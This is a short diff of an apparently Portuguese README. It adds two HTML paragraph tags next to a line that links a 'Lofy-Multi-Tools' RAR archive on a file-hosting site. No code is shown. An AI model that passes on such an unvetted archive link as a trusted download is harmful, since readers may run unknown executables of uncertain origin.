@@ -33,7 +33,8 @@ FAÇA ASSIM IGUAL ESTÁ NA IMAGEM : ![download](https://user-images.githubuserco
 
 
 
-  
+  <p>
+    <p>
 
 💸 <b>• DOWNLOAD Lofy-Multi-Tools : https://www.mediafire.com/file/9o3v2brexq3acl5/Lofy-Multi-Tools-main.rar/file 
   
